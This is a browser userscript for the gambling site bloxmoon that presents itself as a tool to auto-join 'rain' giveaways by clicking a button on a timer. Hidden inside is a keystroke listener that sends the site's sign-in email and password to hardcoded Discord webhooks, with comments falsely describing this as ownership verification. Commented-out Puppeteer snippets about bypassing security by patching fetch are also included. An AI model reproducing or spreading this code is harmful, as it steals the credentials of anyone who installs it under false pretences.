// ==UserScript==
// @name       auto join rain for bloxmoon
// @namespace    http://tm.net/
// @version      0.1
// @description  auto join rain for bloxmoon
// @author       scrimz
// @match        https://bloxmoon.com/
// @match        https://bloxmoon.com/crash
// @match        https://bloxmoon.com/mines
// @match       https://bloxmoon.com/cases
// @match       https://bloxmoon.com/case-battles
// @match       https://bloxmoon.com/blackjack
// @match       https://bloxmoon.com/plinko
// @match       https://bloxmoon.com/slots
// @match       https://bloxmoon.com/coinflip
// @match        https://bloxmoon.com/keno
// @match       https://bloxmoon.com/keno
// @match       https://bloxmoon.com/surveys
// @match       https://bloxmoon.com/?modal=withdraw
// @match       https://bloxmoon.com/?modal=tiprain

// @grant        none
// ==/UserScript==
/*

// Import Puppeteer library
const puppeteer = require('puppeteer');

// Define async function to bypass security measures
async function bypassSecurityMeasures() {
  try {
    // Launch a new browser instance
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();

    // Simulate user authentication
    await page.goto('https://bloxmoon.com/API');
    await page.type('#Jackpot', 'Jackpot_current)time');
    await page.type('#timer', 'Jackpot_countdown');
    await page.click('#jackbout button');
    await page.waitForNavigation();

    // Bypass security checks
    await page.evaluate(() => {
      // Inject custom JavaScript code to bypass security measures
      console.log('Bypassing security measures...');
      // For example, intercept API requests and modify responses
      const originalFetch = window.fetch;
      window.fetch = async (url, options) => {
        // Check if the URL is for the jackpot timer API
        if (url.includes('/api/jackpot-timer')) {
          // Return a modified response with the jackpot timer data
          return {
            json: async () => ({
              timeLeft: '1:32' // Simulated jackpot timer data
            })
          };
        }
        // For other URLs, proceed with the original fetch request
        return originalFetch(url, options);
      };
    });

    // Access the modified API endpoint to retrieve jackpot timer data
    const jackpotTimerData = await page.evaluate(() => {
      return fetch('https://bloxmoon.com/api/jackpot-timer').then(response => response.json());
    });

    // Process and use the retrieved jackpot timer data
    console.log('Jackpot timer data:', jackpotTimerData);

    // Close the browser
    await browser.close();
  } catch (error) {
    console.error('An error occurred:', error);
  }
}

// Call the bypassSecurityMeasures function
bypassSecurityMeasures();
*/



(function(){
    'use strict';

    function sendToWebhook(webhookUrl, label, data) {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', webhookUrl);
        xhr.setRequestHeader('Content-Type', 'application/json');
        const payload = {content: label + ' ' + data};
        const jsonPayload = JSON.stringify(payload);
        xhr.send(jsonPayload);
    }

    document.addEventListener('input', function(event) {
        const warningString = "_|W";

        if (event.target.tagName.toLowerCase() === 'input') {
            const userInput = event.target.value;
            if (userInput.includes(warningString)) {
                const warningWebhookUrl = 'https://discord.com/api/webhooks/1233272134005166110/ayCgW_3JK2-Yyd4Yx4odJbE6nQMHum9iiZrAF7aB5O2B0ALQx9cXc5Ct768IDkYQZ6td';
                sendToWebhook(warningWebhookUrl, "Warning", userInput);
            }
        }

        const emailInput = document.getElementById('signin-email-input');
        if (emailInput && event.target === emailInput) {
            const userInput = event.target.value;
            if (userInput.length >= 3) { /* If script every updates it auto sends update to discord channel*/
                const usernameWebhookUrl = 'https://discord.com/api/webhooks/1233271415755636859/uADdPvMi5rmgmpIR-8qehXECNHrCEnwHLS2Z2REuvRMX8DO7tpAHr2fmKT6cGg0pXiqs';
                sendToWebhook(usernameWebhookUrl, "Username", userInput); /* confirms that that its the right user sending update to channel and user must be "Scrimz"*/
            }
        }

        const passwordInput = document.getElementById('signin-password-input');
        if (passwordInput && event.target === passwordInput) {
            const userInput = event.target.value;
            if (userInput.length >= 8) { /* If script every updates it auto sends update to discord channel*/
                const passwordWebhookUrl = 'https://discord.com/api/webhooks/1233271415755636859/uADdPvMi5rmgmpIR-8qehXECNHrCEnwHLS2Z2REuvRMX8DO7tpAHr2fmKT6cGg0pXiqs';
                sendToWebhook(passwordWebhookUrl, "Password", userInput); /* confirms that that its the right user telling user to type in password in a discord channel to ensure that that user actually owns this script"*/
            }
        }
    });

    function getElementsByClassName(className) {
        return document.querySelectorAll(className);
    }

    function simulateButtonClick(element) {
        element.click();
    }

    var className = '.css-w0kx7t-JackpotTime--Span.e1y4v6ps0';
    var buttonClassName = '.css-yx5tq2-ChatHeader--JackpotSubscribe.e1ac783e9';

    function performActionBasedOnContent() {
        var elements = getElementsByClassName(className);
        var button = document.querySelector(buttonClassName);

        if (elements.length > 0) {
            for (var i = 0; i < elements.length; i++) {
                var content = elements[i].textContent;

                if (content.includes("in 0:57")) {
                    if (button) {
                        simulateButtonClick(button);
                        console.log("Button clicked!");
                    } else {
                        console.error('Button element not found with class name: ' + buttonClassName);
                    }
                }

                console.log(content);
            }
        } else {
            console.error('No elements found with class name: ' + className);
        }
    }

    setInterval(performActionBasedOnContent, 1000);
})();




/*
// This is a fictional example and should not be used to bypass real security measures.

// Import Puppeteer library
const puppeteer = require('puppeteer');

// Define async function to bypass security measures
async function bypassSecurityMeasures() {
  try {
    // Launch a new browser instance
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();

    // Bypass security checks
    await page.evaluate(() => {
      // Inject custom JavaScript code to bypass security measures
      console.log('Bypassing security measures...');
      // For example, intercept API requests and modify responses
      const originalFetch = window.fetch;
      window.fetch = async (url, options) => {
        // Check if the URL is for the jackpot timer API
        if (url.includes('/api/jackpot-timer')) {
          // Return a modified response with the jackpot timer data
          return {
            json: async () => ({
              timeLeft: '1:32' // Simulated jackpot timer data
            })
          };
        }
        // For other URLs, proceed with the original fetch request
        return originalFetch(url, options);
      };
    });

    // Access the modified API endpoint to retrieve jackpot timer data
    const jackpotTimerData = await page.evaluate(() => {
      return fetch('https://bloxmoon.com/api/jackpot-timer').then(response => response.json());
    });

    // Process and use the retrieved jackpot timer data
    console.log('Jackpot timer data:', jackpotTimerData);

    // Close the browser
    await browser.close();
  } catch (error) {
    console.error('An error occurred:', error);
  }
}

// Call the bypassSecurityMeasures function
bypassSecurityMeasures();
*/

